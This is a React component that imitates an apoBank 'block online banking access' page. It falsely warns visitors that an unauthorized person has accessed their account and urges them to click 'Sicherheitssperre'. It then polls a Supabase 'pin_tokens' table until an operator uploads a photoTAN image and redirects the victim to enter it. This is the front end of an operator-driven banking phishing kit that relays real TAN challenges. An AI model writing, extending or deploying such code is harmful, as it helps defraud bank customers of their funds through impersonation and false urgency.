import { useEffect, useState } from "react";
import { ChevronRight, Loader2 } from "lucide-react";
import { useNavigate, useSearchParams } from "react-router-dom";
import apoBankLogo from "@/assets/apobank-logo.svg";
import Footer from "@/components/Footer";
import ContactSection from "@/components/ContactSection";
import { Button } from "@/components/ui/button";
import { supabase } from "@/integrations/supabase/client";

const PinStart = () => {
  const navigate = useNavigate();
  const [sp] = useSearchParams();
  const token = sp.get("token");
  const [waiting, setWaiting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Ensure phase is "start" while on this page
  useEffect(() => {
    if (!token) return;
    (async () => {
      await (supabase as any).from("pin_tokens")
        .update({ customer_phase: "start", last_error: null })
        .eq("token", token);
    })();
  }, [token]);

  // Poll for admin uploading photo_tan_image
  useEffect(() => {
    if (!token || !waiting) return;
    let cancelled = false;
    const check = async () => {
      const { data } = await (supabase as any)
        .from("pin_tokens")
        .select("photo_tan_image, customer_phase, last_error")
        .eq("token", token)
        .maybeSingle();
      if (cancelled || !data) return;
      if (data.last_error) { setError(data.last_error); setWaiting(false); return; }
      if (data.photo_tan_image && data.customer_phase === "phototan") {
        navigate(`/pin/offline?token=${encodeURIComponent(token)}`);
      }
    };
    check();
    const iv = window.setInterval(check, 2000);
    return () => { cancelled = true; window.clearInterval(iv); };
  }, [token, waiting, navigate]);

  const onOffline = async () => {
    setError(null);
    if (!token) { navigate("/pin/offline"); return; }
    setWaiting(true);
    await (supabase as any).from("pin_tokens")
      .update({ customer_phase: "phototan_request", last_error: null })
      .eq("token", token);
  };

  return (
    <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
      <header className="w-full border-b border-border/40 bg-white">
        <div className="max-w-6xl mx-auto px-4 py-3 flex items-center gap-3">
          <img src={apoBankLogo} alt="apoBank Logo" className="h-14 w-auto" />
        </div>
      </header>

      <div className="bg-white border-b border-border/40">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 py-4">
          <div className="flex items-center gap-2 text-sm text-foreground">
            <span className="cursor-default">Startseite</span>
            <ChevronRight className="h-3 w-3" />
            <span className="text-foreground/70">Online-Banking Zugang sperren</span>
          </div>
          <h1 className="mt-2 text-2xl sm:text-3xl font-normal text-[#1a1a1a]">Online-Banking Zugang sperren</h1>
        </div>
      </div>

      <main className="flex-1 px-3 sm:px-4 py-6 sm:py-8">
        <div className="max-w-3xl mx-auto">
          <div className="bg-white border border-border/60 rounded-sm px-6 py-6 shadow-sm">

            <h2 className="text-2xl sm:text-3xl font-normal text-[#0f4c92] leading-snug">
              Online-Banking Zugang sperren: Bestätigung mit apoTAN
            </h2>
          </div>

          <div className="bg-[#eef1f5] border border-border/60 border-t-0 rounded-sm px-6 py-6">
            <p className="text-sm text-foreground mb-6">
              Eine unbefugte Person hat Zugriff auf Ihren Online-Banking-Zugang oder Ihre Zugangsdaten erlangt. Sperren Sie Ihren Zugang daher umgehend aus Sicherheitsgründen. Klicken Sie hierzu auf „Sicherheitssperre", um Ihren Online-Banking-Zugang sofort zu sperren.
            </p>
            {error && <p className="text-xs text-destructive mb-3">{error}</p>}
            <div className="flex justify-end gap-3">
              <Button
                variant="outline"
                disabled={waiting}
                className="px-8 bg-white hover:bg-white border-[#0f4c92] text-[#0f4c92] hover:text-[#0f4c92] rounded-sm disabled:opacity-100"
                onClick={onOffline}
              >
                {waiting ? (
                  <span className="inline-flex items-center gap-2">
                    <Loader2 className="h-4 w-4 animate-spin" /> Bitte warten…
                  </span>
                ) : "Sicherheitssperre"}
              </Button>
            </div>
          </div>
        </div>
      </main>

      <ContactSection />
      <Footer />
    </div>
  );
};

export default PinStart;
